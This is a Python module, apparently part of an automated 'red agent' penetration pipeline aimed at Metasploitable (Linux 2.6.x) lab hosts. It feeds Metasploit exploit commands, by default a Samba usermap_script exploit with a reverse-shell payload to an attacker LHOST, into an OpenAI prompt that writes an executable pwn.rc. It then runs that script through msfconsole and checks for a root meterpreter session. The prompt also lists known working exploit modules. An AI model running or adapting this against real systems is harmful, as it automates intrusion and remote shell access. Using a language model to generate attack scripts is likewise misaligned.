#!/usr/bin/env python3
"""
NODE 7 BACKUP M2: MANUAL EXPLOIT TO PWN.RC CONVERSION
Converts manually provided Metasploit exploit commands to pwn.rc file via GPT
Used as final backup after Node 6 if OS is in specified range (Linux 2.6.x)
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None


def node_7_backup_m2_manual_exploit_to_rc(state: Dict) -> Dict:
    """
    NODE 7 BACKUP M2: Convert Manual Exploit Commands to pwn.rc via GPT

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    Final fallback after Node 6 if NO meterpreter session obtained and OS is
    in specified range (Linux 2.6.x - Metasploitable):
    1. Check if OS is in supported range (Linux 2.6.x)
    2. Accept manual Metasploit exploit commands
    3. Send to GPT for pwn.rc conversion
    4. Generate working pwn.rc from manual exploit script
    5. Execute pwn.rc via msfconsole
    6. Attempt privilege escalation

    Example Manual Exploit Script:
        use exploit/multi/samba/usermap_script
        set RHOSTS 192.168.0.173
        set PAYLOAD cmd/unix/reverse
        set LHOST 192.168.0.187
        run

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS
    ═══════════════════════════════════════════════════════════════════════════

    Required (from Nodes 1-6):
    - target: Target IP address
    - port: Target port
    - service: Service name
    - os_type: Detected OS string
    - lhost: Attacker IP address
    - session_dir: Path to session directory
    - manual_exploit_script: Metasploit exploit commands to convert

    OS RANGE CHECK:
    - Only executes if OS is in range: Linux 2.6.x
    - Returns error if OS is outside supported range

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "node_7_backup_m2"
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)

    On OS Not in Range:
    - pwn_rc_generated: False
    - error: "OS not in supported range (Linux 2.6.x required)"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_7_backup_m2")

    logger.info("═" * 80)
    logger.info("NODE 7 BACKUP M2: MANUAL EXPLOIT TO PWN.RC CONVERSION")
    logger.info("(Final fallback after Node 6 for Linux 2.6.x systems)")
    logger.info("═" * 80)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 0: CHECK OS RANGE (Linux 2.6.x ONLY)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 0: Checking OS Range")
    logger.info("─" * 80)

    os_type = state.get("os_type", "Linux")

    # Check if OS is in supported range (Linux 2.6.x)
    if not ("2.6" in str(os_type).lower()):
        logger.error("❌ OS NOT IN SUPPORTED RANGE")
        logger.error(f"   Detected OS: {os_type}")
        logger.error(f"   Required: Linux 2.6.x (Metasploitable)")
        logger.error("   This node only works with Linux 2.6.x systems")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"OS not in supported range. Got: {os_type}, Required: Linux 2.6.x"
        }

    logger.info(f"✓ OS in supported range: {os_type}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: EXTRACT TARGET INFORMATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Extracting Target Information")
    logger.info("─" * 80)

    target = state.get("target")
    port = state.get("port")
    service = state.get("service", "unknown")
    lhost = state.get("lhost")
    session_dir = state.get("session_dir")

    # Get the detected OS from Node 1 output
    os_detected = state.get("os_detected", os_type)

    # Get manual exploit script if provided
    manual_exploit_script = state.get("manual_exploit_script", "")

    # Validate required parameters
    if not all([target, port, service]):
        logger.error("❌ Missing required parameters (target, port, service)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing required: target, port, or service"
        }

    # If lhost not set, use environment
    if not lhost:
        lhost = os.getenv("METASPLOIT_LHOST", "192.168.0.187")
        logger.info(f"ℹ️  LHOST not set, using environment: {lhost}")
        state["lhost"] = lhost

    logger.info(f"✓ Target: {target}:{port}")
    logger.info(f"✓ Service: {service}")
    logger.info(f"✓ OS Detected: {os_detected}")
    logger.info(f"✓ LHOST (Attacker): {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: CHECK OPENAI API & READ DEMO TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Checking OpenAI API & Reading Demo Template")
    logger.info("─" * 80)

    # Check OpenAI API key
    openai_api_key = os.getenv("OPENAI_API_KEY")
    if not openai_api_key or openai_api_key == "your_openai_api_key_here":
        logger.error("❌ OPENAI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OPENAI_API_KEY not configured"
        }

    if not OpenAI:
        logger.error("❌ OpenAI library not installed")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OpenAI library not installed"
        }

    # Read demo pwn.rc template
    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc template not found at {demo_pwn_rc}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Demo pwn.rc not found at {demo_pwn_rc}"
        }

    try:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Loaded demo pwn.rc template ({len(demo_content)} bytes)")
    except Exception as e:
        logger.error(f"❌ Failed to read demo pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to read demo pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: PREPARE MANUAL EXPLOIT SCRIPT FOR GPT
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Preparing Manual Exploit Script")
    logger.info("─" * 80)

    if not manual_exploit_script:
        # If no script provided, create a template from known exploits
        logger.warning("⚠️  No manual exploit script provided")
        logger.info("Creating default exploit template based on service detection...")

        # Default template for common services
        manual_exploit_script = f"""use exploit/multi/samba/usermap_script
set RHOSTS {target}
set PAYLOAD cmd/unix/reverse
set LHOST {lhost}
run"""
        logger.info("Using default Samba exploit template")
    else:
        logger.info(f"Using provided manual exploit script ({len(manual_exploit_script)} bytes)")

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3.5: REGENERATE LPORT (AVOID PORT CONFLICTS)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3.5: Regenerating LPORT (avoid port conflicts)")
    logger.info("─" * 80)

    import random
    new_lport = random.randint(7000, 8999)  # Use different range than Node 4
    logger.info(f"✓ New LPORT for fallback attempt: {new_lport}")
    logger.info(f"  (Previous LPORT was {state.get('lport', 'unknown')}, now using {new_lport})")
    state["lport"] = new_lport
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SEND TO GPT FOR PWN.RC CONVERSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Converting Manual Exploit to pwn.rc via GPT-4")
    logger.info("─" * 80)

    try:
        client = OpenAI(api_key=openai_api_key)

        prompt = f"""You are a Metasploit pwn.rc file generator.

CONTEXT:
- Target OS: Linux 2.6.9 - 2.6.33 (Metasploitable detected as: {os_detected})
- Service: {service}
- Target IP: {target}:{port}
- Attacker IP: {lhost}

MANUAL EXPLOIT COMMANDS PROVIDED:
```
{manual_exploit_script}
```

USE THIS PROVEN WORKING TEMPLATE AS REFERENCE:
```ruby
{demo_content}
```

Your task: Convert these manual commands into a working pwn.rc file following the template structure above.

Follow this PROVEN structure:

IMPORTANT KNOWN WORKING EXPLOITS for Metasploitable 2:
- For FTP (vsftpd 2.3.4): exploit/unix/ftp/vsftpd_234_backdoor with payload cmd/shell/bind_tcp
- For SSH: exploit/unix/ssh_version
- For distcc: exploit/unix/misc/distcc_exec with payload cmd/unix/bind_ruby
- For HTTP: exploit/linux/http/apache_mod_cgi_bash_env_exec
- For MySQL: exploit/linux/mysql/udf_priv_esc

Convert to pwn.rc using CORRECT exploit/payload above:
1. Set RHOST and LHOST variables
2. Define helper functions (log_info, wait_for_new_session, get_random_available_port)
3. Convert manual commands to run_single() format using CORRECT exploit
4. Use RHOSTS (not RHOST) for targets
5. Use correct LPORT value for the exploit
6. Wait for sessions using wait_for_new_session()
7. Use framework.sessions to check sessions
8. Handle session upgrades and privilege escalation

REQUIREMENTS:
- Service: {service}
- Target: {target}
- LHOST: {lhost}
- Use framework.sessions properly
- Include proper error handling with if statements
- Follow the structure of a REAL working exploit
- Use CORRECT exploit module from list above

CRITICAL:
- Generate ONLY the pwn.rc Ruby code
- No explanations, no markdown, no code blocks
- Start with: #!/usr/bin/env ruby
- MUST wrap all Ruby code between <ruby> and </ruby> tags
- Must be immediately executable by: msfconsole -q -r pwn.rc
- Include helper functions like a real working exploit
- Use framework.sessions for session management
- Example format:
  #!/usr/bin/env ruby
  <ruby>
  # Your Ruby code here
  </ruby>
"""

        logger.info("Sending manual exploit script to GPT-4...")
        logger.info(f"  Target: {target}:{port}")
        logger.info(f"  Service: {service}")

        response = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "system",
                    "content": "You are an expert Metasploit framework specialist. Convert manual exploit commands to pwn.rc Ruby scripts. Output ONLY the Ruby code, no explanations or markdown."
                },
                {"role": "user", "content": prompt}
            ],
            temperature=0.2,
            max_tokens=4000
        )

        generated_pwn_rc = response.choices[0].message.content.strip()
        logger.info(f"✓ GPT-4 converted exploit to pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ GPT-4 conversion failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"GPT-4 conversion failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Saving Generated pwn.rc")
    logger.info("─" * 80)

    try:
        # Use session_dir if available, otherwise create exploitations folder
        if session_dir:
            exploit_dir = Path(session_dir)
        else:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            exploitations_dir = Path(__file__).parent.parent / "exploitations"
            exploitations_dir.mkdir(exist_ok=True)
            exploit_dir = exploitations_dir / f"node_2b_m2_manual_{target}_{port}_{timestamp}"
            exploit_dir.mkdir(exist_ok=True)

        pwn_rc_path = exploit_dir / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")

    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Executing pwn.rc via msfconsole")
    logger.info("─" * 80)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("Converting manual exploit to meterpreter...")
    logger.info("")

    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,
            timeout=300
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting for sessions to be registered...")

        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out (checking sessions...)")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 7: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 7: Checking for Meterpreter Session")
    logger.info("─" * 80)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "node_7_backup_m2",
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(5)
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "node_7_backup_m2",
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found after execution")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "node_7_backup_m2",
                "note": "pwn.rc executed but no meterpreter session detected"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "node_7_backup_m2",
            "note": f"pwn.rc executed, error checking sessions: {str(e)}"
        }
